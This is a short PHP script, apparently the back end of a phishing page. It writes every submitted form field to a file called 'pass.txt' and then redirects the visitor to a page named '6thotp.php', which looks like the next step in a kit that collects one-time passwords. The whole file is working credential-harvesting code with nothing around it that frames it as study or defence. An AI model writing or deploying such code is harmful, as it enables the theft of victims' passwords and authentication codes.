<?php
header('location:6thotp.php');
$handle = fopen("pass.txt","a");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "=");
  fwrite($handle, $value);
  fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>